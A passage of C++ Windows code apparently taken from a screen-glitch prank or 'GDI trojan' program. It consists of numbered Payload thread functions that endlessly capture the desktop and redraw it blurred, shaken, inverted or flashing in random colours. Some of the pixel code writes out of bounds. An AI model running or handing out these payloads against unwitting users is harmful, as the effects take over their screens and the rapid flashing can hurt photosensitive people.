        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(20);
    }
    return 0;
}

DWORD WINAPI Payload9_num1(LPVOID lpParam) {
    while (1) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int i = 0; i < h; i += 20) {
            StretchBlt(hcdc, rand() % 20, i, w, 20, hcdc, rand() % 20, i, w, 20, SRCCOPY);
        }

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload9_num2(LPVOID lpParam) {
    int radius = 20.5f; double angle = 0;
    while (1) {
        float x = cos(angle) * radius, y = sin(angle) * radius;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, x, y, SRCCOPY);
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        angle = fmod(angle + 3.1415926 / radius, 3.1415926 * radius);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload9_num3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true)
    {
        const int size = 5600;
        int x = w / 2, y = h / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI Payload10_num1(LPVOID lpParam) {
    int block_w = 20;
    int block_h = 20;
    while (true) {
        int can1 = 1;
        int jia1 = 0; int jia2 = 0;
        int x; int y;
        int x1 = 0; int y1 = 0;
        int x2 = 0; int y2 = 0;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BOOL bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + block_w;
            if (jia1 > w) {
                bianliang1 = false;
            }
            else {
                can1 = can1 + 1;
            }
        }
        can1 = can1 + 1;
        bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + block_h;
            if (jia2 > h) {
                bianliang1 = false;
            }
            else {
                can2 = can2 + 1;
            }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < can2 + 1; i++) {
            for (int k = 0; k < can1 + 1; k++) {
                x = rand() % can1;
                y = i;
                if (x == 1) {
                    x1 = 0;
                }
                else if (x == 2) {
                    x1 = block_w;
                }
                else {
                    x1 = block_w * x - block_w;
                }

                if (y == 1) {
                    y1 = 0;
                }
                else if (y == 2) {
                    y1 = block_h;
                }
                else {
                    y1 = block_h * y - block_h;
                }

                x = rand() % can1;
                y = rand() % can2;
                if (x == 1) {
                    x2 = 0;
                }
                else if (x == 2) {
                    x2 = block_w;
                }
                else {
                    x2 = block_w * x - 1;
                }

                if (y == 1) {
                    y2 = 0;
                }
                else if (y == 2) {
                    y2 = block_h;
                }
                else {
                    y2 = block_h * y - 1;
                }

                StretchBlt(hcdc, x1, y1, block_w, block_h, hcdc, x2, y2, block_w, block_h, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        jia1 = 0; jia2 = 0;
        can1 = 0;
        can2 = 0;
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI Payload10_num2(LPVOID lpParam) {
    BLENDFUNCTION blur;
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 15) {
            for (int x = 0; x < w; x += 15) {
                StretchBlt(hcdc, x, y, 15, 15, hcdc, x, y, 1, 1, SRCCOPY);
            }
        }
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI Payload10_num3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = rand() % 114;; BYTE bt = 0;
        bt = rand() & 0xffffff;
        for (int i = 0; w * h > i; i++) {
            ((BYTE*)(data + i))[v ? 222 : 555] += ((BYTE*)(data + i))[i % 22] & bt;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
    }
    return 0;
}

DWORD WINAPI Payload11_num1(LPVOID lpParam) {
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)((4 ^ i) + ((8 & i) * tan(x * 2)) + (12 * i));

                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen -= fx;
                rgbquad[index].rgbBlue += fx;
            }
        }

        i++;
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 70;
        StretchBlt(hcdc, 0, 0, w, h, hcdc, 1, 1, w, h, SRCERASE);
        StretchBlt(hcdc, 1, 1, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload11_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        int rand_num_x = rand() % w;
        int rand_num_y = rand() % h;

        int top_x = 0 + rand_num_x;
        int top_y = 0 + rand_num_y;

        int bottom_x = 240 + rand_num_x;
        int bottom_y = 240 + rand_num_y;
        HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
        InvertRgn(hdc, circle);
        DeleteObject(circle);
        ReleaseDC(0, hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI Payload12_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, w, h, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int sepiaRed = round(.114 * rgbtriple[i].rgbtRed + .514 * rgbtriple[i].rgbtGreen + .191 * rgbtriple[i].rgbtBlue);
            int sepiaGreen = round(.191 * rgbtriple[i].rgbtRed + .888 * rgbtriple[i].rgbtGreen + .256 * rgbtriple[i].rgbtBlue);
            int sepiaBlue = round(.365 * rgbtriple[i].rgbtRed + .666 * rgbtriple[i].rgbtGreen + .222 * rgbtriple[i].rgbtBlue);

            if (sepiaBlue > 255)
            {
                sepiaBlue = 255;
            }

            if (sepiaRed > 255)
            {
                sepiaRed = 255;
            }

            if (sepiaGreen > 255)
            {
                sepiaGreen = 255;
            }
            rgbtriple[i].rgbtRed += sepiaRed;
            rgbtriple[i].rgbtGreen -= sepiaGreen;
            rgbtriple[i].rgbtBlue -= sepiaBlue;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload12_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload12_num3(LPVOID lpParam) {
    BLENDFUNCTION blur;
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int y = 0; y < h; y += 50) {
            for (int x = 0; x < w; x += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 45, 45, NOTSRCERASE);
            }
        }
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 25;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI Payload13_num1(LPVOID lpParam) {
    BLENDFUNCTION blur;
    while (1) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload13_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            int v = rand() % 50;
            ((BYTE*)(data + i))[v * v] *= x * y;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload14_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        BYTE byte = (1 + rand() % 255);
        for (int i = 0; w * h > i; i++) {
            int v = rand() % 1000;
            *((BYTE*)data + 4 * i + v) = ((BYTE*)(data + i + v))[v] % byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload15_num1(LPVOID lpParam) {
    int i = 0; RGBQUAD rgbquadCopy; HSL hslcolor;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = x * h + y;
                int fx = (int)((i ^ 3) + (i * 6) * cbrt(x * i ^ i * y + x ^ i + y + i ^ i * x & y ^ i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                hslcolor.s = 2.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteObject(hBrush);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI Payload16_num1(LPVOID lpParam) {
    HBRUSH hBrush;
    BLENDFUNCTION blur;
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 50;
    int size = 60;
    for (;;) {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int x = 0; x < w; x += size) {
            for (int y = 0; y < h; y += size) {
                hBrush = CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, x, 0, size, h, PATINVERT);
                DeleteObject(hBrush);
                hBrush = CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, 0, y, w, size, PATINVERT);
                DeleteObject(hBrush);
                StretchBlt(hcdc, x, y, size, size, hcdc, x, y, 45, 45, SRCCOPY);
            }
        }

        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI Payload16_num2(LPVOID lpParam) {
    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = w * y + x;

                int cx = x - (w / 2);
                int cy = y - (h / 2);

                int zx = (cx * cx);
                int zy = (cy * cy);

                int di = 128 + i;
                int fx = (int)di + (di * sin(cbrt(zx + zy) / 2.8));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload16_num3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1); HBRUSH hBrush;
    while (true) {
        int x = rand() % w;
        int y = rand() % h;
        HDC hdc = GetDC(0);
        hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hBrush);
        BitBlt(hdc, x, 10, 100, h, hdc, x, 0, RGBBRUSH);
        BitBlt(hdc, x, -10, -100, h, hdc, x, 0, RGBBRUSH);
        ReleaseDC(NULL, hdc);
        DeleteObject(hBrush);
        DeleteDC(hdc);
        hdc = GetDC(0);
        hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hBrush);
        BitBlt(hdc, 10, y, w, 96, hdc, 0, y, RGBBRUSH);
        BitBlt(hdc, -10, y, w, -96, hdc, 0, y, RGBBRUSH);
        ReleaseDC(NULL, hdc);
        DeleteObject(hBrush);
        DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload17_num1(LPVOID lpParam) {
    int xxx = 0;
    BLENDFUNCTION blur;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        int randrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / h;
            int jntm = x ^ y;
            rgbScreen[i].rgb = randrgb - ((jntm * xxx) % 1145);
        }
        xxx++;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 80;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload17_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int size = 500;
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 0x9999999);
        for (int i = 0; i < 60; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, 0x9999999);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI Payload18_num1(LPVOID lpParam) {
    int xxx = 0;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            int code = i + (x ^ y);
            rgbScreen[i].rgb = y / 2 << (code * xxx / 256);
        }
        xxx++;
        BLENDFUNCTION blur;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 150;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload19_num1(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / h;
            rgbScreen[i].rgb += RGB(x + 11, x, x - 45) * y;
        }
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload20_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = x * h + y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(0, 0);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI Payload20_num2(LPVOID lpParam) {
    while (true)
    {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x1 = rand() % 8;
        int y1 = rand() % h;
        int x2 = (x1 - 5) + rand() % ((x1 + 5) - (x1 - 5) + 1);
        int y2 = (y1 - 10) + rand() % ((y1 + 10) - (y1 - 10) + 1);
        HDC hdc = GetDC(0);
        BitBlt(hdc, x2, y2, w, rand() % (h - y2), hdc, x1, y1, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(rand() % 100);
    }
    return 0;
}

DWORD WINAPI Payload20_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int count = 0;
        for (int i = 0; i < h; i++)
        {
            HDC hdc = GetDC(0);
            BitBlt(hdc, 0, i, w, 1, hdc, 0, i, NOTSRCCOPY);
            ReleaseDC(NULL, hdc);
            if (count == 10) {
                count = 0;
                Sleep(1);
            }
            else {
                count++;
            }
        }
        Sleep(10 + rand() % 2490);
    }
    return 0;
}

DWORD WINAPI Payload20_num4(LPVOID lpParam) {
